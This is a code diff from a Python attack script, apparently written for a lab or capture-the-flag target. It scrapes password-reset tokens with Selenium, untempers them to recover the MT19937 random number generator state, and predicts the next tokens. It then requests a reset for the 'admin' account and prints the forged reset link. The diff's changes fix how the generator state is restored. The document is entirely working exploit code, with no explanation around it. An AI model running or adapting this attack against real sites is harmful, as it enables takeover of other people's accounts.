@@ -62,11 +62,10 @@ for i in range(78):
     token = driver.find_element(By.XPATH, "/html/body/div[3]/center/form/p")
     token_list += tokenSeparator(token.text.split("token=")[1])
     time.sleep(0.3)
-print(token_list)
 token_list = list(map(lambda x: untemper_number(int(x)), token_list))
 generator = MT19937(b"0")
 generator.mt = token_list
-generator.index = 0
+generator.index = generator.n
 generated_numbers = []
 for i in range(8):
     generated_numbers.append(generator.extract_number())
@@ -80,9 +79,10 @@ username_input.send_keys("admin")
 reset_button = driver.find_element(By.ID, "Reset")
 reset_button.submit()
 
-print(BASE_PASSWORD_RESET_URL + combineTokens(generated_numbers))
-
 # Generate the reset link
+
+reset_link = BASE_PASSWORD_RESET_URL + combineTokens(generated_numbers)
+print(reset_link)
 
 # Go to that reset link
 
